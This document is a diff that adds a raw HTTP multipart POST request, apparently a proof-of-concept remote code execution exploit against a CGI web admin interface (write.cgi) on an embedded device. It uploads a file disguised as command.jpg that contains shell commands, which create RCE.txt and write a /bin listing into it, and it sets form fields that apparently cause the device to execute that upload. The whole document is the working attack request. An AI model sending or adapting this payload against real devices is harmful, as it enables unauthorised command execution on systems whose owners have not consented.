@@ -1,0 +1,63 @@
+POST /cgi-bin/write.cgi HTTP/1.1
+Host: 78.67.29.120
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-AR,en-US;q=0.7,en;q=0.3
+Referer: http://78.67.29.120/cgi-bin/read.cgi?page=templates/page_edit.html&id=1&path=Page;id=1&error=
+Cookie: ID=0bce4b7eb065092efd274212b25c50e1
+Connection: close
+Content-Type: multipart/form-data; boundary=---------------------------1816993527151539919951297987
+Content-Length: 1513
+
+-----------------------------1816993527151539919951297987
+Content-Disposition: form-data; name="script1"
+
+file
+-----------------------------1816993527151539919951297987
+Content-Disposition: form-data; name="filename1"
+
+/home/httpd/pageimages/3.jpg
+-----------------------------1816993527151539919951297987
+Content-Disposition: form-data; name="maxsize1"
+
+50
+-----------------------------1816993527151539919951297987
+Content-Disposition: form-data; name="script2"
+
+dummy
+-----------------------------1816993527151539919951297987
+Content-Disposition: form-data; name="filename2"
+
+
+-----------------------------1816993527151539919951297987
+Content-Disposition: form-data; name="script3"
+
+xml
+-----------------------------1816993527151539919951297987
+Content-Disposition: form-data; name="file3"
+
+/etc/config/pages.xml
+-----------------------------1816993527151539919951297987
+Content-Disposition: form-data; name="path3"
+
+Page;id=1
+-----------------------------1816993527151539919951297987
+Content-Disposition: form-data; name="attribute3"
+
+image
+-----------------------------1816993527151539919951297987
+Content-Disposition: form-data; name="value3"
+
+3.jpg
+-----------------------------1816993527151539919951297987
+Content-Disposition: form-data; name="content1"; filename="command.jpg"
+Content-Type: image/jpeg
+
+cd /home/httpd/
+touch RCE.txt
+chmod 775 RCE.txt
+
+echo "bins: "> RCE.txt
+ls -la  /bin > RCE.txt
+
+-----------------------------1816993527151539919951297987--
